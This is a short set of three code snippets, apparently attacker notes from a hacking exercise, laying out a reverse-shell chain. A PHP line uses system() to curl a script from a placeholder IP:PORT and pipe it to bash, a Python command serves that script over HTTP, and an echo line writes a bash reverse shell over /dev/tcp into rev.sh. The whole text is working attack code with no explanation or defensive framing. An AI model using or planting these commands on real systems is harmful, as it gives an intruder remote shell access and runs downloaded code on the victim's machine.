
```php
<?php system("curl IP:PORT/rev.sh|bash"); ?>
```

```bash
python3 -m http.server PORT
```

```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/IP/PORT 0>&1' > rev.sh
```

